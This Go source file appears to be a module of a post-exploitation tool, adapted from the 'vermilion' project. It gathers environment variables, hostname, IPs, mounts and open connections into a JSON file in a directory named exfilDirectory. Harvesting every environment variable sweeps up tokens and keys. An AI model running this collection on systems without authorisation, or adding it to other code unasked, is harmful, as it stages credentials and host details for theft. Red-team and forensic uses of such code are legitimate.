package internals

// Code mostly taken from https://github.com/R3DRUN3/vermilion/blob/main/internal/scan.go
// I liked most of his implementation, credit to above repo. Light modifications made.

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)
// saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
func SaveSystemInfo(exfilDirectory string) (string, error) {
	systemInfo, err := GetSystemInfo()
	if err != nil {
		return "", fmt.Errorf("[!] Failed to retrieve system info: %w", err)
	}

	// Convert system info to JSON
	data, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return "", fmt.Errorf("[!] Failed to serialize system info: %w", err)
	}

	// Write system info to a file
	filePath := filepath.Join(exfilDirectory, "system_info.json")
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", fmt.Errorf("[!] Failed to write system info to file: %w", err)
	}

	return filePath, nil
}

// GetSystemInfo retrieves environment variables, OS info, and IP addresses.
func GetSystemInfo() (map[string]interface{}, error) {
	info := make(map[string]interface{})

	// Get environment variables
	info["env_vars"] = os.Environ()

	// Get OS info
	info["os"] = map[string]string{
		"os":      runtime.GOOS,
		"arch":    runtime.GOARCH,
		"num_cpu": fmt.Sprintf("%d", runtime.NumCPU()),
	}

	// Get current user and hostname
	user, err := os.UserHomeDir()
	if err == nil {
		info["current_user"] = user
	} else {
		info["current_user"] = "N/A"
	}

	hostname, err := os.Hostname()
	if err == nil {
		info["hostname"] = hostname
	} else {
		info["hostname"] = "N/A"
	}

	// Get local IP addresses
	var localIPs []string
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ip, ok := addr.(*net.IPNet); ok && !ip.IP.IsLoopback() {
				if ip.IP.To4() != nil {
					localIPs = append(localIPs, ip.IP.String())
				} else if ip.IP.To16() != nil {
					localIPs = append(localIPs, ip.IP.String())
				}
			}
		}
	}
	info["local_ips"] = localIPs

	// Get system uptime
	uptime, err := getSystemUptime()
	if err == nil {
		info["uptime"] = uptime
	} else {
		info["uptime"] = "N/A"
	}

	// Get load averages (Linux-specific)
	loadAvg, err := getLoadAverage()
	if err == nil {
		info["load_avg"] = loadAvg
	} else {
		info["load_avg"] = "N/A"
	}

	// Get mounted file systems
	mountedFS, err := getMountedFileSystems()
	if err == nil {
		info["mounted_filesystems"] = mountedFS
	} else {
		info["mounted_filesystems"] = "N/A"
	}

	// Get active network connections
	connections, err := getActiveConnections()
	if err == nil {
		info["active_connections"] = connections
	} else {
		info["active_connections"] = "N/A"
	}

	// Get installed packages (Linux-specific)
	//packages, err := getInstalledPackages()
	//if err == nil {
	//	info["installed_packages"] = packages
	//} else {
	//	info["installed_packages"] = "N/A"
	//}

	return info, nil
}

// Helper functions

func getSystemUptime() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/uptime")
		if err != nil {
			return "", err
		}
		fields := strings.Fields(string(data))
		uptimeSeconds, err := strconv.ParseFloat(fields[0], 64)
		if err != nil {
			return "", err
		}
		uptime := time.Duration(uptimeSeconds) * time.Second
		return uptime.String(), nil
	}
	return "Unsupported OS for uptime", nil
}

func getLoadAverage() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/loadavg")
		if err != nil {
			return "", err
		}
		return string(data), nil
	}
	return "Unsupported OS for load average", nil
}

func getMountedFileSystems() ([]string, error) {
	var result []string
	file, err := os.Open("/proc/mounts")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) > 1 {
			result = append(result, fields[1]) // Append mount point
		}
	}

	return result, nil
}

func getActiveConnections() ([]string, error) {
	if runtime.GOOS == "linux" {
		out, err := exec.Command("ss", "-tulnp").Output()
		if err != nil {
			return nil, err
		}
		return strings.Split(string(out), "\n"), nil
	}
	return nil, fmt.Errorf("unsupported os for active connections")
}

// This function needs heavy modification, we need to do more granular detection of what type of
// system we are on before we start blasting commands like a crazy person. I like the idea, not the
// implementation
/*
func getInstalledPackages() ([]string, error) {
	var packages []string
	if runtime.GOOS == "linux" {
		cmds := [][]string{
			{"dpkg", "-l"},      // Debian-based systems
			{"rpm", "-qa"},      // Red Hat-based systems
			{"pacman", "-Q"},    // Arch-based systems
			{"apk", "info"},     // Alpine Linux
			{"flatpak", "list"}, // Flatpak
			{"snap", "list"},    // Snap
		}
		for _, cmd := range cmds {
			out, err := exec.Command(cmd[0], cmd[1:]...).Output()
			if err == nil {
				packages = append(packages, strings.Split(string(out), "\n")...)
			}
		}
		return packages, nil
	}
	return nil, fmt.Errorf("unsupported os for installed packages")
}
*/